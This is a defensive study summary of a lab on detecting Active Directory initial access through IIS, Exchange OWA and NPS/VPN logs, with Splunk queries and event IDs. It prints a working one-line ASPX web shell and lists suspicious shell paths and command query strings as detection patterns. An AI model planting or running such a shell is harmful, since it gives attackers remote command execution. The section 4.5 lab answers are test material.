**Detailed Summary – Detecting AD Initial Access (Premium Room)**  

---

### 1. Overview  
- **Goal:** Teach how to detect initial‑access attacks against Active Directory (AD) by analysing logs from three common internet‑facing services: **IIS web applications**, **Exchange OWA**, and **VPN gateways**.  
- **Key Principle:** The attack first appears in the **application log** (IIS, NPS, etc.). Correlating these logs with **Sysmon** and **Windows Security** events reveals the full scope of the breach.

---

### 2. Why AD Expands the Attack Surface  
- A **stand‑alone web server** limits damage to that single machine.  
- In an **AD‑joined environment**, all services (web apps, Exchange, VPN) authenticate against the **same central directory**, turning each service into a **potential entry point to the entire domain**.  
- Attackers can compromise a service at the **application layer** before ever reaching AD, then use the compromised credentials to move laterally.

---

### 3. IIS (Internet Information Services)  

#### 3.1 What IIS Is  
- Microsoft’s web‑server platform; hosts Exchange, SharePoint, ADFS, and many internal apps.  
- Authentication flow: user ⇢ IIS ⇢ AD. Successful/failed logons are recorded as **Event 4624** or **4625** on the web server, and **Event 4776** on the Domain Controller.

#### 3.2 Log Location & Format  
- **Default path:** `C:\inetpub\logs\LogFiles\W3SVC1`.  
- Logs are in **W3C format** – one line per HTTP request, timestamps always in **UTC**.  
- Important fields for detection:  

| Field | Description | Why It Matters |
|------|-------------|----------------|
| `c-ip` | Client IP address | Identify attacker source |
| `cs-uri-stem` | Requested URI path | Spot web‑shell or admin URLs |
| `cs-uri-query` | Query string | May contain commands (`cmd=whoami`) |
| `cs-method` | HTTP method (GET/POST) | POST to unusual files is suspicious |
| `sc-status` | HTTP response code | 200 = success, 401 = failure, 302 = redirect (OWA) |
| `cs(User-Agent)` | Browser/tool string | Detect automated tools (curl, Python) |

#### 3.3 Normal vs. Suspicious Patterns  

| Pattern | Normal | Suspicious |
|---------|--------|------------|
| **Auth volume** | Few logins per user/day | Hundreds from one IP within minutes |
| **Timing** | Business‑hour logins from known subnets | Odd hours, unknown subnets |
| **URI paths** | `/owa/`, `/ecp/`, `/internalapp/default.aspx` | `/aspnet_client/system_web/shell.aspx`, `/uploads/cmd.aspx` |
| **Query strings** | Typical parameters (`ViewAction=ReadMessage`) | Commands (`?cmd=whoami`, `?exec=ipconfig`) |
| **Methods** | GET for pages, POST for login forms | POST to static file directories |
| **Status codes** | Occasional 404s (typos) | Hundreds of 404s from same IP (scanning) |

---

### 4. Detecting Web‑Shell Deployment  

#### 4.1 What a Web Shell Is  
- A malicious script (commonly **`.aspx`**) that executes OS commands via HTTP requests.  
- Example payload:  

```csharp
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>
```  

- Accepts a `cmd` parameter in the URL and runs it on the server.

#### 4.2 Real‑World Cases  
- **March 2021 – HAFNIUM**: Used ProxyLogon exploits to drop **China Chopper** `.aspx` shells in `C:\inetpub\wwwroot\aspnet_client\`.  
- **2023 – CISA**: Reported similar `.aspx` shells on U.S. government IIS servers via a Telerik UI vulnerability.  

#### 4.3 Core Detection Pattern  
- **Normal IIS:** `w3wp.exe` processes HTTP requests **without spawning child processes**.  
- **Web‑shell activity:** `w3wp.exe` **spawns** `cmd.exe`, `powershell.exe`, or other tools → strong indicator of compromise.

#### 4.4 Investigation Steps (Splunk)  

1. **Identify Scanning Activity** – Look for bursts of `sc_status=404` from a single IP.  
2. **Find Suspicious `.aspx` Files** – Filter the same IP for `sc_status=200` and list the requested `cs_uri_stem`.  
3. **Track Web‑Shell Interaction** – Search for that `.aspx` file, view `cs_uri_query` (the commands).  
4. **Trace Process Chain (Sysmon)** – Query `EventCode=1` where `ParentImage` contains `w3wp.exe` to see spawned processes.  
5. **Locate Deployment Time** – Use Sysmon `EventCode=11` (FileCreate) for the shell file, or search IIS POST requests containing the filename.

#### 4.5 Example Answers (from lab)  
- **Web‑shell filename:** `shell.aspx`  
- **Attacker IP:** `203.0.113.47`  
- **First reconnaissance command:** `whoami`

---

### 5. Exchange OWA Credential Attacks  

#### 5.1 Terminology  
- **Exchange:** Email server.  
- **Outlook:** Desktop client.  
- **OWA (Outlook Web Access):** Browser‑based email portal (runs on IIS).  

#### 5.2 OWA Log Characteristics  
- **Successful login:** POST to `/owa/auth.owa` → **302** redirect to inbox.  
- **Failed login:** Same POST → **302** redirect back to login page; query string includes `reason=2`.  
- **IIS logs** lack the username; use **Windows Security logs** (`Event 4624` for success, `4625` for failure) to capture the account name.

#### 5.3 Key Virtual Directories  
- `/owa` – OWA login page (primary target for credential attacks).  
- `/ecp` – Exchange Control Panel (admin console; rare access, high risk).

#### 5.4 Investigation Flow (Splunk)  

1. **Detect Brute‑Force Signal:** High count of POSTs to `/owa/auth.owa` from a single IP in a short window.  
2. **Identify Targeted Account:** Pivot to `Event 4625` logs, group by `user`. Highest count = target.  
3. **Correlate Success/Failure:** Use `Event 4624`/`4625` with `Logon_Type=8` (NetworkCleartext) for the target user.  
4. **Post‑Authentication Activity:** Search IIS for that IP’s subsequent URI accesses; presence of `/ecp` indicates admin‑panel compromise.

#### 5.5 Example Answers (from lab)  
- **Failed attempts:** 15  
- **Compromised username:** `sarah.kim`  
- **Attacker IP:** `203.0.113.47`  
- **Post‑login admin path:** `/ecp`

---

### 6. VPN Credential Attacks (NPS‑Based)  

#### 6.1 Architecture  
- VPN gateways (Fortinet, Cisco, Palo Alto, etc.) rarely talk directly to AD; they use **RADIUS** via the Windows **Network Policy Server (NPS)**.  
- When NPS is used, authentication events appear in NPS logs; otherwise, events are logged directly on the VPN device and on the Domain Controller (`Event 4776`).

#### 6.2 Important NPS Event IDs  

| Event ID | Meaning | Security Relevance |
|----------|---------|--------------------|
| **6272** | Network Policy Server **granted** access | Successful VPN login |
| **6273** | Network Policy Server **denied** access | Failed VPN login |
| **6274** | Request **discarded** (malformed) | Not directly an attack |

- **Reason Code 16** (in 6273) = *Unknown username or bad password* → credential‑attack indicator.  
- Reason codes **48** and **65** indicate configuration issues, not attacks.

#### 6.3 Normal vs. Malicious VPN Activity  
- **Normal:** Logins during business hours, from expected locations, occasional isolated failures.  
- **Malicious:** Rapid clusters of 6273 events for the same user/IP (brute‑force/spraying) or a single 6272 event without prior failures (credential reuse or purchased creds).

#### 6.4 Investigation Steps (Splunk)  

1. **Scope the Attack:** Query `EventCode=6273` → group by `User_Account_Name` and `Client_IP_Address`.  
2. **Confirm Compromise:** Look for both 6273 (failures) *and* 6272 (success) for the same user.  
3. **Correlate with Security Logon Events:** Use `Event 4624/4625` on the DC to see the actual AD authentication attempts (Logon_Type 8). These provide timestamps, session IDs, and post‑login activity.  

#### 6.5 Example Answers (from lab)  
- **Compromised VPN username:** `david.chen`  
- **Successful VPN authentication time:** `10:47:06`

---

### 7. Investigation Methodology Recap  

1. **Start with the Application Log** (IIS, NPS, etc.) to spot unusual volume, status codes, or file accesses.  
2. **Correlate with Windows Security / Sysmon** events to confirm authentication results and see what processes were spawned.  
3. **Build a Timeline** that links the initial suspicious request → credential validation → post‑login activity.  
4. **Identify Impact** (e.g., web‑shell execution, Exchange admin access, VPN lateral movement).  
5. **Respond Appropriately** (isolate host, disable compromised accounts, hunt for lateral movement).

---

### 8. Key Takeaways  

- **AD centralizes authentication**, turning any internet‑facing service into a potential gateway to the entire domain.  
- **IIS logs** (UTC timestamps, specific fields) are the primary source for web‑app and Exchange OWA investigations.  
- **Web‑shell detection** hinges on spotting `w3wp.exe` spawning command‑line processes and unusual `.aspx` files in writable directories such as `/aspnet_client/`.  
- **OWA credential attacks** require joint analysis of IIS and Windows Security logs to map IPs to usernames.  
- **VPN attacks** are captured via **NPS** events when RADIUS is used; reason code 16 is the hallmark of a password‑guessing attempt.  
- **Correlation across log sources** (application logs, Sysmon, Windows Security) is essential to move from detection to a full incident timeline and impact assessment.  

---  

*Prepared by DocQA, a module developed by Digital Excellence Centre (DEC), Deloitte.*
